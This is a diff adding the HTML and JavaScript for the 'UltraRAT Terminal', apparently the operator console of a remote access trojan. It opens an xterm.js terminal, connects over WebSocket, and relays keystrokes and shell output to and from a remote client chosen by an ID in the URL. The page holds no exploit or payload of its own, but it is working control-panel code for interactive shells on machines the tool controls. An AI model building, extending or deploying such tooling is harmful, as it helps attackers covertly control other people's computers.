@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Terminal - UltraRAT</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #0c0c0c;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .terminal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 15px;
+      background: #1a1a1a;
+      border-bottom: 2px solid #333;
+    }
+
+    .terminal-header h2 {
+      font-size: 14px;
+      color: #00d9ff;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .status-indicator {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #e74c3c;
+      animation: pulse 1s infinite;
+    }
+
+    .status-dot.connected {
+      background: #27ae60;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .terminal-container {
+      flex: 1;
+      padding: 10px;
+      overflow: hidden;
+    }
+
+    #terminal {
+      height: 100%;
+      width: 100%;
+    }
+
+    .close-btn {
+      background: #e74c3c;
+      color: white;
+      border: none;
+      padding: 5px 15px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 12px;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .close-btn:hover {
+      background: #c0392b;
+    }
+  </style>
+</head>
+<body>
+  <div class="terminal-header">
+    <h2>UltraRAT Terminal - <span id="clientId">Connecting...</span></h2>
+    <div class="status-indicator">
+      <div class="status-dot" id="statusDot"></div>
+      <span id="statusText">Connecting...</span>
+    </div>
+    <button class="close-btn" onclick="window.close()">Close</button>
+  </div>
+  <div class="terminal-container">
+    <div id="terminal"></div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/xterm-addon-web-links@0.9.0/lib/xterm-addon-web-links.min.js"></script>
+  <script>
+    const clientId = window.location.pathname.split('/').pop();
+    document.getElementById('clientId').textContent = clientId;
+
+    // Initialize xterm.js with minimal settings - let PTY control everything
+    const term = new Terminal({
+      cursorBlink: true,
+      fontSize: 14,
+      fontFamily: 'Consolas, Monaco, "Courier New", monospace',
+      theme: {
+        background: '#1a1a1a',
+        foreground: '#cccccc',
+        cursor: '#00d9ff',
+        cursorAccent: '#1a1a1a',
+        selection: 'rgba(0, 217, 255, 0.3)'
+      },
+      scrollback: 10000,
+      tabStopWidth: 4,
+      // Critical: disable local echo - PTY handles all echo
+      disableStdin: false,
+      // Ensure proper cursor behavior
+      drawBoldTextInBrightColors: true,
+      minimumContrastRatio: 1
+    });
+
+    const fitAddon = new FitAddon.FitAddon();
+    const webLinksAddon = new WebLinksAddon.WebLinksAddon();
+
+    term.loadAddon(fitAddon);
+    term.loadAddon(webLinksAddon);
+
+    let ws;
+    let shellReady = false;
+    let pendingWrites = [];
+    let isProcessingWrites = false;
+
+    function connect() {
+      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${protocol}//${window.location.host}`);
+
+      ws.onopen = () => {
+        document.getElementById('statusDot').classList.add('connected');
+        document.getElementById('statusText').textContent = 'Connected';
+        ws.send(JSON.stringify({ type: 'shell_init' }));
+      };
+
+      ws.onmessage = (event) => {
+        const message = JSON.parse(event.data);
+        handleMessage(message);
+      };
+
+      ws.onclose = () => {
+        document.getElementById('statusDot').classList.remove('connected');
+        document.getElementById('statusText').textContent = 'Disconnected';
+        shellReady = false;
+      };
+
+      ws.onerror = () => {
+        shellReady = false;
+      };
+    }
+
+    // Queue writes to prevent race conditions
+    function queueWrite(data) {
+      pendingWrites.push(data);
+      processWriteQueue();
+    }
+
+    function processWriteQueue() {
+      if (isProcessingWrites || pendingWrites.length === 0) return;
+
+      isProcessingWrites = true;
+      const data = pendingWrites.shift();
+
+      // Use requestAnimationFrame for smoother rendering
+      requestAnimationFrame(() => {
+        term.write(data, () => {
+          isProcessingWrites = false;
+          processWriteQueue();
+        });
+      });
+    }
+
+    function handleMessage(message) {
+      switch (message.type) {
+        case 'shell_ready':
+          shellReady = true;
+          // Clear any initial screen and position cursor
+          term.write('\x1b[2J\x1b[H'); // Clear screen and home cursor
+          setTimeout(() => term.focus(), 50);
+          break;
+
+        case 'shell_output':
+          queueWrite(message.data);
+          break;
+
+        case 'shell_closed':
+          shellReady = false;
+          queueWrite(`\r\n\x1b[33mShell closed (exit code: ${message.code})\x1b[0m\r\n`);
+          break;
+
+        case 'error':
+          queueWrite(`\r\n\x1b[31mError: ${message.message}\x1b[0m\r\n`);
+          break;
+      }
+    }
+
+    // Handle terminal input - send all keystrokes to shell
+    term.onData((data) => {
+      if (ws && ws.readyState === WebSocket.OPEN && shellReady) {
+        ws.send(JSON.stringify({
+          type: 'shell_data',
+          data: data
+        }));
+      }
+    });
+
+    // Handle resize
+    function updateSize() {
+      fitAddon.fit();
+      if (ws && ws.readyState === WebSocket.OPEN && shellReady) {
+        ws.send(JSON.stringify({
+          type: 'resize',
+          cols: term.cols,
+          rows: term.rows
+        }));
+      }
+    }
+
+    window.addEventListener('resize', updateSize);
+
+    // Open and connect
+    term.open(document.getElementById('terminal'));
+    updateSize();
+    term.focus();
+    connect();
+
+    // Keep focus on terminal
+    document.addEventListener('click', () => {
+      if (shellReady) term.focus();
+    });
+  </script>
+</body>
+</html>
